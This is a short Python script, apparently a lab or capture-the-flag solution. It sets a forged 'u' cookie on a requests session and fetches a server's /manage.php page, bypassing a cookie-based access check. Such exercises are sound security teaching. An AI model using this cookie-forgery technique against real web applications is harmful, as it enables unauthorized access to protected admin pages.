import requests

local = False

if local:
    URL = "http://localhost:8010"
else:
    URL = 'https://141.85.224.70:8010'

s = requests.Session()

# This line is optional. We can set the cookie ourselves if we want.
s.get(URL)

s.cookies.set('u', 'hacky mchack')

resp = s.get(f'{URL}/manage.php')
print(resp.text)
